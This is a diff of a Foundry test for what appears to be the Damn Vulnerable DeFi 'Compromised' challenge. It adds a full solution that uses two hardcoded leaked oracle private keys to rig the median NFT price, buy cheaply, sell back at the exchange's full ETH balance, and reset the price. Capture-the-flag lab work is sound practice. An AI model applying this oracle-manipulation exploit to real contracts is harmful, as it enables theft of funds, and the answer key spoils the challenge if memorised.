@@ -57,16 +57,10 @@ contract Compromised is Test {
         }
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        trustfulOracle = new TrustfulOracleInitializer(
-            sources,
-            symbols,
-            initialPrices
-        ).oracle();
+        trustfulOracle = new TrustfulOracleInitializer(sources, symbols, initialPrices).oracle();
 
         // Deploy the exchange and get the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
-            address(trustfulOracle)
-        );
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(trustfulOracle));
         damnValuableNFT = exchange.token();
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
@@ -76,7 +70,55 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        uint256 medianPrice = trustfulOracle.getMedianPrice("DVNFT");
+        console.log("Median price: ", medianPrice);
 
+        // Manipulate the median price with leaked private keys
+        uint256 source1PrivateKey = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint256 source2PrivateKey = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+
+        address source1 = vm.addr(source1PrivateKey);
+        address source2 = vm.addr(source2PrivateKey);
+
+        vm.prank(source1);
+        trustfulOracle.postPrice("DVNFT", 0.01 ether);
+
+        vm.prank(source2);
+        trustfulOracle.postPrice("DVNFT", 0.1 ether);
+
+        // Check the median price again
+        medianPrice = trustfulOracle.getMedianPrice("DVNFT");
+        console.log("Updated median price to buy: ", medianPrice);
+
+        // Buy a token for 0.1 ether
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 0.1 ether}();
+
+        console.log("Token ID bought: ", tokenId);
+
+        // Manipulate the median price again
+        vm.prank(source1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+
+        vm.prank(source2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + 0.1 ether);
+
+        // Check the median price again
+        medianPrice = trustfulOracle.getMedianPrice("DVNFT");
+        console.log("Updated Median price to sell: ", medianPrice);
+
+        // Sell the token back to the exchange
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+
+        // Revert the median price
+        vm.prank(source1);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(source2);
+        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
         /**
          * EXPLOIT END *
          */
